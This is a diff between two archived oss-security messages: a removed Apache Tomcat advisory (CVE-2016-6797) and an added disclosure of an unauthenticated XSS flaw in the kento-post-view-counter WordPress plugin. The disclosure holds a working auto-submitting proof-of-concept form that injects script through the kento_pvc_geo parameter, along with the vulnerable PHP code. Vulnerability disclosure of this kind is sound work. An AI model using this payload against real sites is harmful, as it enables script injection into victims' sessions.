@@ -1,48 +1,87 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/27/7
-Message-ID: <ee9f7a88-b1d2-8a62-e572-c9bb66e36a0e@apache.org>
-Date: Thu, 27 Oct 2016 13:31:42 +0100
-From: Mark Thomas <markt@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/16/2
+Message-ID: <CAOmn9FTgrvG=cU61iYqAfUWmAcQe0Hc7h3E3WSfWP17-CRt_Jw@mail.gmail.com>
+Date: Sat, 16 Apr 2016 13:41:31 +0530
+From: shravan kumar <cor3sm4sh3r@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: [SECURITY] CVE-2016-6797 Apache Tomcat Unrestricted Access to Global Resources
+Subject: Unauthenticated XSS Vulnerability in kento-post-view-counter Wordpress Plugin 2.8
 Content-Type: text/plain; charset=utf-8
 
-CVE-2016-6797 Apache Tomcat Unrestricted Access to Global Resources
+I would like to disclose  a Unauthenticated XSS vulnerability
+in kento-post-view-counter  plugin version 2.8 .
 
-Severity: Low
+The Plugin can be found at
+*https://wordpress.org/plugins/kento-post-view-counter/
+<https://wordpress.org/plugins/kento-post-view-counter/>*
 
-Vendor: The Apache Software Foundation
+This Bug can be triggered by unauthenticated / Authenticated user. If a
+user is sent a URL by social engineering and the user clicks the link the
+bug can be triggered.
 
-Versions Affected:
-Apache Tomcat 9.0.0.M1 to 9.0.0.M9
-Apache Tomcat 8.5.0 to 8.5.4
-Apache Tomcat 8.0.0.RC1 to 8.0.36
-Apache Tomcat 7.0.0 to 7.0.70
-Apache Tomcat 6.0.0 to 6.0.45
-Earlier, unsupported versions may also be affected.
+The URL should be something like this
 
-Description
-The ResourceLinkFactory did not limit web application access to global
-JNDI resources to those resources explicitly linked to the web
-application. Therefore, it was possible for a web application to access
-any global JNDI resource whether an explicit ResourceLink had been
-configured or not.
+http://attackerssite.com/XSS_POC.html
 
-Mitigation
-Users of affected versions should apply one of the following mitigations
-- Upgrade to Apache Tomcat 9.0.0.M10 or later
-- Upgrade to Apache Tomcat 8.5.5 or later
-- Upgrade to Apache Tomcat 8.0.37 or later
-- Upgrade to Apache Tomcat 7.0.72 or later
-  (Apache Tomcat 7.0.71 has the fix but was not released)
-- Upgrade to Apache Tomcat 6.0.47 or later
-  (Apache Tomcat 6.0.46 has the fix but was not released)
 
-Credit:
-This issue was discovered by the Apache Tomcat Security Team.
+The code for XSS_POC.html is as follows:
 
-References:
-[1] http://tomcat.apache.org/security-9.html
-[2] http://tomcat.apache.org/security-8.html
-[3] http://tomcat.apache.org/security-7.html
-[4] http://tomcat.apache.org/security-6.html
+<html>
+  <body onload="document.forms['xss'].submit()" >
+    <form name="xss" action="http://targetsite/wp-admin/admin-ajax.php"
+method="POST" >
+
+  <input type="hidden" name="action" value="kento_pvc_top_geo" />
+  <input type="hidden" name="kento_pvc_geo" value="
+<script>alert(1);</script>" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
+
+
+
+Technical Details:
+
+The vulnerable page is
+
+wp-content/plugins/kento-post-view-counter/index.php
+
+The Code responsible for the vulnerability :
+
+LINE NO 219 onwards
+if(isset($_POST['kento_pvc_geo']))
+{
+$geo = $_POST['kento_pvc_geo'];
+}
+if(empty($geo))
+{
+$geo ="country";
+}
+.....
+....
+Line No 240
+$top_geo.= "<th scope='col' class='manage-column column-name' ><strong>"
+.ucfirst($geo)."</strong></th>";
+
+
+Line No 245
+
+$top_geo.= "<th scope='col' class='manage-column column-name' ><strong>"
+.ucfirst($geo)."</strong></th>";
+
+Line No 283
+
+echo $top_geo;
+
+The $top_geo parameter is displayed in unsafe manner without escaping HTML
+chars .
+
+The vulnerable POST parameters is:
+
+
+   - kento_pvc_geo
+
+
+-- 
+Shravan Kumar
+
